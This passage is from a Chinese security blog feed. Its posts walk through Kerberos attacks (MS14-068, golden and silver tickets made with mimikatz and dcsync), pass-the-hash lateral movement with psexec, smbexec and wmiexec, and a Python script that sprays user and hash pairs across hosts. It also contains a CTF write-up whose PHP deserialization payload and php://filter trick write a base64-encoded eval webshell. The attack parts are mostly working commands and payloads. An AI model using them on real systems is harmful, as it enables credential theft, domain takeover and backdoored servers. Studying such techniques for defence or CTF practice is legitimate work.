src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304236.png" alt="img"></p><p>3、清空本地缓存的票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304589.png" alt="img"></p><p>4、清空mimikatz缓存的票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304866.png" alt="img"></p><p>5、利用MS14-068.EXE 生成票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u alex@god.org -p password -s sid -d owa.god.org</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304177.png" alt="img"></p><p>6、Mimikatz导入票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ptc TGT_alex@god.org.ccache</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304873.png" alt="img"></p><p>7、Psexec 横向命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Psexec.exe \\owa cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304729.png" alt="img"></p><h3 id="黄金票据伪造TGT"><a href="#黄金票据伪造TGT" class="headerlink" title="黄金票据伪造TGT"></a>黄金票据伪造TGT</h3><p>​      在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个 Session Key和TGT,而 TGT是由krbtgt的NTLM Hash加密的，所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。</p><p>​      黄金票据常用于权限维持。 当我们获得域控的控制权限后，可以获取krbtgt的ntlm hash。当由于一些原因导致我们失去对域控的控制权后，并且krbtgt的密码没有更改，此时我们可以利用krbtgt用户的ntlm hash制作黄金票据伪造tgt，从而重新获取域控的管理权限。</p><p><strong>利用条件</strong></p><p>1、域名称。</p><p>2、域的SID值。</p><p>3、域的KRBTGT账号的HASH（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）。</p><p>4、伪造任意用户名。</p><h4 id="手动-1"><a href="#手动-1" class="headerlink" title="手动"></a>手动</h4><p>1、基本信息获取（SID,所处域）</p><p>SID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304123.png" alt="img"></p><p>所在域</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304257.png" alt="img"></p><p>2、获取krbtgt用户hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:god.org /all /csv</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304961.png" alt="img"></p><p>3、制作黄金票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden/user:administrator/domain:god.org/sid:S-1-5-21-2952760202-1353902439-2381784089/krbtgt:58e91a5ac358d86513ab224312314061/ticket:tic.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304736.png" alt="img"></p><p>4、导入内存</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304735.png" alt="img"></p><p>5、票据传递</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172304442.png" alt="img"></p><h3 id="白银票据伪造ST"><a href="#白银票据伪造ST" class="headerlink" title="白银票据伪造ST"></a>白银票据伪造ST</h3><p>​    如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。 在Kerberos认证的第三步，Client带着ST向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的server ntlm hash 解密ST, 进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。 所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。<strong>利用条件</strong></p><p>1.域名。</p><p>2.域sid。</p><p>3.目标服务器名。</p><p>4.可利用的服务。</p><p>5.服务账号的NTML HASH。</p><p>6.需要伪造的用户名。</p><h4 id="手动-2"><a href="#手动-2" class="headerlink" title="手动"></a>手动</h4><p>1、基本信息获取（SID，所处域，服务器名，NTLM HASH）</p><p>SID和所在域</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span> /user &amp; net config workstation</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172305688.png" alt="img"></p><p>服务名和NTLM HASH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords&quot;</span>  <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure><p>mimikatz.exe “privilege::debug” “sekurlsa::logonPasswords”  “exit”</p><p>2、制作白银票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089  /target:owa.god.org /service:cifs /rc4:5b52d5fc54aa6803f97816a4e7d19358 /user:owa /ptt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172305451.png" alt="img"></p><p>3、访问域控根目录</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172307475.png" alt="img"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>白银票据通常用于攻击域控，黄金票据则用于拿下域控后权限维持。</p><p>简单对比黄金票据和白银票据：</p><ul><li>黄金票据：是直接抓取域控中ktbtgt账号的hash，来在client端生成一个TGT票据，那么该票据是针对所有机器的所有服务。</li><li>白银票据：实际就是在抓取到了域控服务hash的情况下，在client端以一个普通域用户的身份生成TGS票据，并且是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的target机器中指定的服务。</li></ul><p>白银票据可伪造列表：</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/202211172305030.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 横向移动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>psexec-smbexec-wmiexec横向移动</title>
      <link href="/2022/11/15/psexec-smbexec-wmiexec%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2022/11/15/psexec-smbexec-wmiexec%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><p>psexec是windows提供的工具，所以杀毒软件将其列在白名单中,，通过psexec可以将管理员权限提升至system权限以运行指定程序。psexec基本原理是：通过管道在远程计算机上创建一个psexec服务，并在本地磁盘中生成一个名为”PSESESVC”的二进制文件，然后通过psexec服务运行命令，运行结束后删除服务。首先需要获取目标操作系统的交互式shell。在建立ipc$的情况下，执行如下命令。获取system权限的shell。  </p><p>psexec参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框</span><br><span class="line">-u：用户名</span><br><span class="line">-p：密码</span><br><span class="line">-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell</span><br><span class="line">-i： 运行该程序，以便它与远程系统上指定会话的桌面进行交互。如果没有指定会话，进程将在控制台会话中运行</span><br></pre></td></tr></table></figure><p>建立ipc连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ <span class="string">&quot;password&quot;</span> /user:username</span><br><span class="line"><span class="comment"># 关闭ipc连接</span></span><br><span class="line"><span class="comment"># net use \\ip\ipc$ /del </span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172255956.png" alt="img"></p><p>命令执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># system权限执行</span></span><br><span class="line">psexec \\ip -s cmd /accepteula</span><br><span class="line"><span class="comment"># 当前用户执行</span></span><br><span class="line">PsExec.exe -accepteula \\ip -s cmd.exe /c <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172255070.png" alt="img"></p><p>无法获取密码时：psexec+PTH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !官方Pstools无法采用hash连接</span></span><br><span class="line"><span class="comment"># 工作组</span></span><br><span class="line">psexec -hashes :$HASH$ ./administrator@192.168.52.143</span><br><span class="line"><span class="comment"># 域环境</span></span><br><span class="line">psexec -hashes :$HASH$ domain/administrator@10.1.2.3</span><br><span class="line"><span class="comment"># 测试 8a963371a63944419ec1adf687bb1be5</span></span><br></pre></td></tr></table></figure><p>获得交互shell（后边加个参数可单条命令执行）</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172255555.png" alt="img"></p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ul><li>将PSEXESVC.exe上传到ADMIN$（指向&#x2F;admin$&#x2F;system32&#x2F;PSEXESVC.EXE）共享文件夹内，也可能时其它共享文件夹内的随机可执行文件名称。如：存在exchange时共享文件夹为：address共享。</li><li>远程创建用于运行PSEXESVC.exe的服务；</li><li>远程启动服务。</li></ul><p>PSEXESVC服务充当一个重定向器。它在远程系统上运行指定的可执行文件（事例中的是cmd.exe）。同时，它通过主机之间来重定向进程的输入&#x2F;输出（利用命名管道）。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>1、需要远程系统开启admin共享（默认是开启的），原理是基于IPC共享，目标需要开放445端口和admin。在使用IPC连接目标系统后，不需要输入账户和密码。获取到一台机器时可查看是否有ipc连接记录。</p><p>2、 在使用PsExec执行远程命令时，会在目标系统中创建一个psexec的服务。命令执行完后，psexec服务将被自动删除。由于创建或删除服务时会产生大量的日志，可以在攻击溯源时通过日志反推攻击流程。  </p><p>3、使用PsExec可以直接获得System权限的交互式Shell（前提目标是administrator权限的shell）</p><p>4、在域环境测试时发现，非域用户无法利用内存中的票据使用PsExec功能，只能依靠账号和密码进行传递。</p><h2 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h2><p> SMBExec 与 PSExec 非常相似，但是，SMBExec 不会将二进制文件放入磁盘。SMBExec 利用一个批处理文件和一个临时文件来执行和转发消息。与 PSExec 一样，SMBExec 通过 SMB 协议 (445&#x2F;TCP) 发送输入并接收输出。  </p><h3 id="简单使用-1"><a href="#简单使用-1" class="headerlink" title="简单使用"></a>简单使用</h3><p>smbexec无需先ipc链接 明文或hash传递。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">smbexec god/administrator:Admin12345@192.168.3.21</span><br><span class="line">smbexec ./administrator:admin!@<span class="comment">#45@192.168.3.32</span></span><br><span class="line">smbexec -hashes :$HASH$ ./admin@192.168.3.21</span><br><span class="line">smbbexec -hashes :$HASH$ domain/admin@192.168.3.21</span><br><span class="line">smbexec -hashes :8a963371a63944419ec1adf687bb1be5 ./administrator@192.168.3.32</span><br><span class="line">smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</span><br></pre></td></tr></table></figure><p>​明文：</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172255965.png" alt="img"></p><p>hash：</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172256168.png" alt="img"></p><h2 id="WMI服务和wmiexec"><a href="#WMI服务和wmiexec" class="headerlink" title="WMI服务和wmiexec"></a>WMI服务和wmiexec</h2><p>内网渗透中经常用到psexec这个工具，可以很方便的得到一个半交互式的cmd shell。但是psexec也有一些问题：psexec需要对方开启ADMIN$共享，而且需要安装服务，安装服务会留下明显的日志，而且服务没有删除的风险更大，管理员很容易就会发现。</p><p>优点：不需要创建服务，在内存中运行，隐蔽性好</p><p>缺点：⽹络请求较多；需要对⽅开启rpc服务。</p><p>大致原理：先使用凭证与目标进行认证，再通过调用目标的wmi创建并启用服务，然后把结果输出到共享中，再通过IPC$读取结果。</p><h3 id="简单使用-2"><a href="#简单使用-2" class="headerlink" title="简单使用"></a>简单使用</h3><p>服务利用，命令无回显，需要远程读取。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create <span class="string">&quot;cmd.exe /c  ipconfig &gt;C:\1.txt&quot;</span></span><br></pre></td></tr></table></figure><p>套件impacket wmiexec 明文或hash传递 有回显exe版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmiexec ./administrator:admin!@<span class="comment">#45@192.168.3.32 &quot;whoami&quot;</span></span><br><span class="line">wmiexec god/administrator:Admin12345@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :8a963371a63944419ec1adf687bb1be5 ./administrator@192.168.3.32 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :8a963371a63944419ec1adf687bb1be5 god/administrator@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172256454.png" alt="img"></p><h2 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h2><p>当端口结果中的某台主机开启了139、445，但是没开启3389.可通过psexec，命令执行。为了实现批量探测可以编写python脚本，然后编译成exe在跳板机上执行&gt;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mack&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">hashs=&#123;</span><br><span class="line">    <span class="string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line"><span class="keyword">for</span> mimahash <span class="keyword">in</span> hashs:</span><br><span class="line"><span class="comment">#wmiexec -hashes :hash god/user@ip whoami</span></span><br><span class="line"><span class="built_in">exec</span> = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; god/&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="built_in">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">os.system(<span class="built_in">exec</span>)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 横向移动 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这是测试</title>
      <link href="/2022/11/15/notes/%E8%BF%99%E6%98%AF%E6%B5%8B%E8%AF%95/"/>
      <url>/2022/11/15/notes/%E8%BF%99%E6%98%AF%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="No，达咩！." data-whm="what?.">  <script id="hbeData" type="hbeData" data-hmacdigest="b0abe0ef90494a06e81b79e4451e634b6b79e570f8b8ad774cd00c3f01b0e649">14c81c6975c83b10b233c11b511f05ff96ca51c2d1a2a9cde9bbf3e2d2273aa26b6ad1e6bb0f753f40f050eabf36d2edc5385aef635fbdd890994fd49543aa1682df747128aab66afa98019615b693e2ce9e5a243d0d031d095ce033049b6146184a2c8105dfcf608e68e89f3c2a4ad6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-flip">      <input class="hbe hbe-input-field hbe-input-field-flip" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-flip" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-flip" data-content="您好, 这里需要密码.">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-file_get_content函数和suser.ini文件上传白名单</title>
      <link href="/2022/11/14/CTF-file_get_content%E5%87%BD%E6%95%B0%E5%92%8Csuser.ini%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%99%BD%E5%90%8D%E5%8D%95/"/>
      <url>/2022/11/14/CTF-file_get_content%E5%87%BD%E6%95%B0%E5%92%8Csuser.ini%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%99%BD%E5%90%8D%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>拿到题目：</p><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257519.png" alt="image-20221114010956169"></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>1、先绕过isset($text)&amp;&amp;(file_get_contents($text,’r’)&#x3D;&#x3D;&#x3D;”welcome to the zjctf”)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="comment">//text/plain,welcome to the zjctf</span></span><br></pre></td></tr></table></figure><p>​利用data协议读取逗号后边的字符串。</p><p>2、绕过preg_match(“&#x2F;flag&#x2F;“,$file)。并且包含这个文件。下边给了提示uselles.php</p><p>为了拿到源码我们可以利用 php:&#x2F;&#x2F;filter协议来读取useless.php  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;file=php:<span class="comment">//filter/read=convert.base64-encode/resource=useless.php</span></span><br></pre></td></tr></table></figure><p>​</p><p>3、读到base64编码的useless.php文件之后，解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>​4、反序列化绕过，读源码我们需要file&#x3D;flag.php。因此</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">  </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>​最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="comment">//text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$content</span> .= <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>写shell</p><p>思路：可以通过php:&#x2F;&#x2F;filter以二进制流打文件，将文件内容以base64解码形式写入，导致<?php exit; ?>被以base64解码，使它称为乱码，让整个PHP脚本以我们传入的木马执行</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/write=convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgQGV2YWwoJF9QT1NUWyd3d3cnXSk7ID8+</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a 